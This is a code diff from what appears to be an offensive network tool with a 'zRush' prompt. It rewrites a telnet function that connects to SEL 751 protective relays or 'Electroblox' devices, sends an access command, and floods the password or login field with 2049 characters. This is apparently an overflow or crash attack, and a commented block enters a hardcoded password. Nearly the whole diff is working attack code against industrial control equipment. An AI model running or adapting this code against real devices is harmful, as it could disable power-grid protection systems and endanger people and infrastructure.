@@ -288,16 +288,69 @@ def ARPSpoof(src, dst, dport):
         restore(dst, gateway_ip)
 
 def telnet_long(src, dst, dport):
-    tn = telnetlib.Telnet(dst)
-    tn.read_until(b"TERMINAL SERVER")
-    tn.write(b"\n")
-    tn.read_until(b"=")
-    tn.write(b"acc")
-    tn.read_until("Password: ? ")
-    user = "X"*9999
-    tn.write(user.encode('ascii')+b"\n")
-    tn.write(b"\n")
-    tn.write(b"exit\n")
-    print(tn.read_all().decode('ascii'))
+    print("[*] select option")
+    print("    1. SEL 751")
+    print("    2. Electroblox")
+    iput = input("zRush > ")
+    tn = telnetlib.Telnet()
+    tn.open(dst)
 
+    """
+    tn.read_until(b"TERMINAL SERVER")
+    print("2")
+    tn.write(b"a")
+    tn.read_until(b"a")
+    tn.write(b"c")
+    tn.read_until(b"c")
+    tn.write(b"c")
+    tn.read_until(b"c")
+    tn.write(b"\r")
+
+    tn.read_until(b"Password: ? ")
+    tn.write(b"O")
+    tn.read_until(b"*")
+    tn.write(b"T")
+    tn.read_until(b"*")
+    tn.write(b"T")
+    tn.read_until(b"*")
+    tn.write(b"E")
+    tn.read_until(b"*")
+    tn.write(b"R")
+    tn.read_until(b"*")
+    tn.write(b"\r")
+    """
+    if iput == "1":
+        # for SEL 751
+        tn.read_until(b"TERMINAL SERVER")
+        tn.write(b"a")
+        tn.read_until(b"a")
+        tn.write(b"c")
+        tn.read_until(b"c")
+        tn.write(b"c")
+        tn.read_until(b"c")
+        tn.write(b"\r")
+        tn.read_until(b"Password: ? ")
+        i = 0
+        while(i < 2049):
+            tn.write(b"X")
+            tn.read_until(b"*")
+            i+=1
+        tn.write(b"\r")
+
+        tn.write(b"quit\r\n")
+        tn.write(b"exit\r\n")
+        print(tn.read_all().decode('ascii'))
+    elif iput == "2":
+        # for electroblox
+        tn.read_until(b"login:")
+        i = 0
+        while(i < 2049):
+            tn.write(b"X")
+            tn.read_until(b"X")
+            i+=1
+        tn.write(b"\r")
+
+        tn.write(b"quit\r\n")
+        tn.write(b"exit\r\n")
+        print(tn.read_all().decode('ascii'))
 
